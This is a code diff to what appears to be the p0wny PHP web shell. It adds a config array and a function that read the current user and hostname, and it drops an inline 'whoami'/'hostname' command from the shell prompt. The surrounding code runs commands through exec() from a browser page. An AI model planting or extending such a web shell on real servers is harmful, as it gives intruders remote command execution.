@@ -1,5 +1,10 @@
 <?php
 
+$SHELL_CONFIG = [
+    'username' => 'p0wny',
+    'hostname' => 'shell',
+];
+
 function expandPath($path) {
     if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
         exec("echo $match[1]", $stdout);
@@ -70,6 +75,18 @@ function featureShell($cmd, $cwd) {
         "stdout" => $stdout,
         "cwd" => getcwd()
     );
+}
+
+function featureCurrentUser() {
+    $username= posix_getpwuid(posix_geteuid())['name'];
+    if ($username === false) {
+        $username = "p0wny";
+    }
+    $hostname = gethostname();
+    if ($hostname === false) {
+        $hostname = "shell";
+    }
+    return ["username" => $username, "hostname" => $hostname];
 }
 
 function featurePwd() {
@@ -148,6 +165,8 @@ if (isset($_GET["feature"])) {
     header("Content-Type: application/json");
     echo json_encode($response);
     die();
+} else {
+    $SHELL_CONFIG = array_merge($SHELL_CONFIG, featureCurrentUser());
 }
 
 ?><!DOCTYPE html>
@@ -299,6 +318,7 @@ if (isset($_GET["feature"])) {
         </style>
 
         <script>
+            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
             var CWD = null;
             var commandHistory = [];
             var historyPosition = 0;
@@ -424,11 +444,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                let info = "<?php echo htmlentities(executeCommand('echo `whoami`@`hostname`')); ?>";
-                if (info === "") {
-                    info = "p0wny@shell";
-                }
-                return info + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
